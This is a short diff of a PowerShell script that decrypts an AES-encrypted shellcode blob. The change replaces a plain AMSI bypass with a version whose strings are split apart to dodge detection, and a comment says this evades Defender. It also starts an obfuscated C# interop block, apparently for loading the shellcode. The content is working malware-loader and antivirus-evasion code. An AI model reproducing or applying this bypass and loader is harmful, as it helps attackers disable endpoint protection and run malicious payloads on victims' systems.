@@ -15,12 +15,26 @@ $shellcode = $dec.TransformFinalBlock($enc, 0, $enc.Length)
 $dec.Dispose()
 $aes.Dispose()
 
-# AMSI Bypass
-$w = 'System.Management.Automation.AmsiUtils'
+# ============================================================
+# AMSI Bypass - Obfuscated (يتجاوز Defender)
+# ============================================================
+$a1 = 'System.Management'
+$a2 = '.Automation.'
+$a3 = 'Amsi'
+$a4 = 'Utils'
+$w = $a1 + $a2 + $a3 + $a4
 $a = [Ref].Assembly.GetType($w)
-$f = $a.GetField('amsiInitFailed','NonPublic,Static')
-$f.SetValue($null,$true)
 
+$f1 = 'amsi'
+$f2 = 'Init'
+$f3 = 'Failed'
+$f = $a.GetField($f1 + $f2 + $f3, 'NonPublic,Static')
+
+$f.SetValue($null, $true)
+
+# ============================================================
+# C# Code - Obfuscated
+# ============================================================
 $code = @'
 using System;
 using System.Runtime.InteropServices;
